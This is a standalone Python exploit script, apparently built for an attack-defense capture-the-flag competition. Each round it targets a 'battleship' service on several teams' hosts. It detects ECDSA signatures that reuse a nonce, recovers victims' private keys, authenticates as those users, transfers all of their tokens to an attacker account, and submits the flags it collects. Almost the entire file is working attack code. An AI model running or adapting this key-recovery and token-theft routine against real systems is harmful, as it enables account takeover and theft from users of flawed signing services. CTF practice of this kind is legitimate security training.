#!/usr/bin/env python3
"""
Battleship CTF - Auto Farmer (standalone)
Runs 'glitch targets battleship' each round, exploits k-nonce reuse
to recover private keys, steals tokens, and submits flags via 'glitch submit'.

Usage: python3 farmer.py
"""

import sys, re, subprocess, time, json, base64, hashlib, requests
from cryptography.hazmat.primitives.asymmetric.ec import derive_private_key, SECP256R1
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
from cryptography.hazmat.backends import default_backend

# ── Config ───────────────────────────────────────────────────────────────────
ATTACKER  = "atk_farmer"
SLEEP_SEC = 90
FLAG_RE   = re.compile(r'[A-Z0-9]{31}=')
PORT      = 7451

TEAMS = {
    "Example1":             "10.100.1.1",
    "Example2":             "10.100.2.1",
    "Example3":             "10.100.3.1",
    "Example4": 	    "10.100.4.1",
    # "ExampleMyTeam":      "10.100.5.1",  # never touch, make sure to replace service IPs
    "Example6":             "10.100.6.1",
    "Example7":             "10.100.7.1",
}
# ─────────────────────────────────────────────────────────────────────────────

# ── Crypto helpers ────────────────────────────────────────────────────────────
N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551

def modinv(a, m): return pow(a, -1, m)

def unpack_sig(b64):
    raw = base64.b64decode(b64)
    return int.from_bytes(raw[:32], 'big'), int.from_bytes(raw[32:], 'big')

def struct_hash(json_str):
    b64 = base64.b64encode(json_str.encode()).decode()
    h = hashlib.sha256(b64.encode()).digest()
    return int.from_bytes(h, 'big')

def game_json(g):
    cf = "true" if g['creator_first'] else "false"
    return f'{{"creator":"{g["creator"]}","creator_first":{cf},"grid_size":{g["grid_size"]},"nonce":{g["nonce"]}}}'

def move_json(m):
    x, y = m['move']['X'], m['move']['Y']
    return f'{{"game_id":null,"move":{{"X":{x},"Y":{y}}},"player":{m["player"]},"nonce":{m["nonce"]}}}'

def recover_key(r, s1, s2, e1, e2):
    k = ((e1 - e2) * modinv((s1 - s2) % N, N)) % N
    d = ((s1 * k - e1) * modinv(r, N)) % N
    assert (modinv(k, N) * (e1 + d * r)) % N == s1
    return d

def d_to_b64(d):
    key = derive_private_key(d, SECP256R1(), default_backend())
    return base64.b64encode(
        key.private_bytes(Encoding.DER, PrivateFormat.TraditionalOpenSSL, NoEncryption())
    ).decode()

# ── API helpers ───────────────────────────────────────────────────────────────
def api(base, path, method='GET', **kw):
    return requests.request(method, f"{base}{path}", timeout=10, **kw)

def ensure_attacker(base):
    keys = api(base, "/api/user/genkeys").json()
    api(base, "/api/user/register", method='POST',
        json={"username": ATTACKER, "pubkey": keys['pubkey'], "token": "dummy"})
    return api(base, "/api/user/token", method='POST',
               json={"username": ATTACKER, "privkey": keys['privkey']}).json().get('token')

# ── Core exploit ──────────────────────────────────────────────────────────────
def steal_from(server_ip, username):
    """Exploit k-nonce reuse to steal all tokens from username. Returns list of flag strings."""
    base = f"http://{server_ip}:{PORT}"

    # Find target's creator_first=True game
    try:
        games = api(base, "/api/games/list").json().get('games', [])
    except Exception:
        return []

    candidates = [g for g in games
                  if g.get('game_data', {}).get('creator') == username
                  and g.get('game_data', {}).get('creator_first')
                  and len(g.get('signatures', [])) >= 2]
    if not candidates:
        return []

    g = candidates[0]
    gd, md, sigs = g['game_data'], g['move_data'], g['signatures']

    # Confirm k-reuse
    r1, s1 = unpack_sig(sigs[0])
    r2, s2 = unpack_sig(sigs[1])
    if r1 != r2:
        return []

    # Recover private key
    e1 = struct_hash(game_json(gd))
    e2 = struct_hash(move_json(md))
    d = None
    for s2v in [s2, (N - s2) % N]:
        try:
            d = recover_key(r1, s1, s2v, e1, e2)
            break
        except AssertionError:
            continue
    if d is None:
        return []

    privkey_b64 = d_to_b64(d)

    # Get victim auth token
    try:
        auth = api(base, "/api/user/token", method='POST',
                   json={"username": username, "privkey": privkey_b64}).json().get('token')
        if not auth:
            return []

        tokens = api(base, "/api/tokens/getall",
                     headers={"Authorization": auth}).json().get('tokens', [])

        # Ensure attacker account exists
        atk_auth = ensure_attacker(base)

        # Transfer each token
        flags = []
        for t in tokens:
            tid = t.get('TokenId') or t.get('token_id') or t.get('_id', '')
            val = t.get('Token') or t.get('token', '')
            resp = api(base, "/api/tokens/transfer", method='POST',
                       headers={"Authorization": auth, "Content-Type": "application/json"},
                       json={"token_id": tid, "recipient": ATTACKER})
            if resp.status_code == 200 and FLAG_RE.match(val):
                flags.append(val)
        return flags
    except Exception:
        return []

# ── Glitch helpers ────────────────────────────────────────────────────────────
def get_targets():
    try:
        proc = subprocess.run(["glitch", "targets"],
                              capture_output=True, text=True, timeout=15)
        # glitch may write to stderr on some setups
        text = proc.stdout or proc.stderr
        result = parse_usernames(text)
        if not result:
            print("[-] Raw glitch output (debug):")
            print(repr(text[:500]) if text else "  (empty)")
        return result
    except FileNotFoundError:
        print("[-] 'glitch' not found in PATH")
        return {}
    except subprocess.TimeoutExpired:
        print("[-] 'glitch targets' timed out")
        return {}

def parse_usernames(text):
    # Strip ANSI color codes
    text = re.sub(r'\x1b\[[0-9;]*m', '', text)

    if "battleship:" in text:
        m = re.search(r'^battleship:\n(.*?)(?=^\S|\Z)', text, re.MULTILINE | re.DOTALL)
        text = m.group(1) if m else ""

    result = {}
    current_team, current_users = None, []
    for line in text.splitlines():
        m = re.match(r'^\s{2}(\S+)\s+\(\d+\.\d+\.\d+\.\d+\)\s*:', line)
        if m:
            if current_team and current_team in TEAMS:
                result[current_team] = current_users
            current_team, current_users = m.group(1), []
            continue
        m = re.match(r'^\s{4}\d+:\s+([A-Za-z0-9]{4,})\s*$', line)
        if m and current_team:
            username = m.group(1)
            if not username.isdigit():   # exclude logger (all-numeric) entries
                current_users.append(username)
    if current_team and current_team in TEAMS:
        result[current_team] = current_users
    return result

def submit(flags):
    """Submit each flag individually via 'glitch submit <flag>'."""
    for flag in flags:
        try:
            result = subprocess.run(["glitch", "submit", flag],
                                    capture_output=True, text=True, timeout=15)
            out = (result.stdout + result.stderr).strip()
            print(f"  [SUBMIT] {flag} -> {out}")
        except FileNotFoundError:
            print("  [SUBMIT ERR] 'glitch' not found")
        except Exception as e:
            print(f"  [SUBMIT ERR] {flag} -> {e}")

# ── Main loop ─────────────────────────────────────────────────────────────────
submitted = set()
round_num = 1

print(f"[*] ECDSA k-Nonce farmer starting (attacker={ATTACKER}, sleep={SLEEP_SEC}s)")
print(f"[*] Targets: {', '.join(TEAMS.keys())}")

while True:
    print(f"\n{'='*55}")
    print(f"[*] Round {round_num}  {time.strftime('%H:%M:%S')}")
    print(f"{'='*55}")

    targets = get_targets()
    if not targets:
        print("[-] No targets parsed — check glitch targets output")
        time.sleep(SLEEP_SEC)
        round_num += 1
        continue

    new_flags = []

    for team, ip in TEAMS.items():
        users = targets.get(team, [])
        if not users:
            print(f"  [?] {team} ({ip}) — not in glitch output")
            continue

        print(f"  [*] {team} ({ip})  {len(users)} targets")
        for username in users:
            flags = steal_from(ip, username)
            for flag in flags:
                if flag not in submitted:
                    print(f"      [FLAG] {username} -> {flag}")
                    new_flags.append(flag)
                    submitted.add(flag)
            if not flags:
                print(f"      [miss] {username}")

    if new_flags:
        print(f"\n[*] Submitting {len(new_flags)} new flag(s)...")
        submit(new_flags)
    else:
        print("\n[*] No new flags this round")

    round_num += 1
    print(f"[*] Sleeping {SLEEP_SEC}s  (total collected: {len(submitted)})")
    time.sleep(SLEEP_SEC)
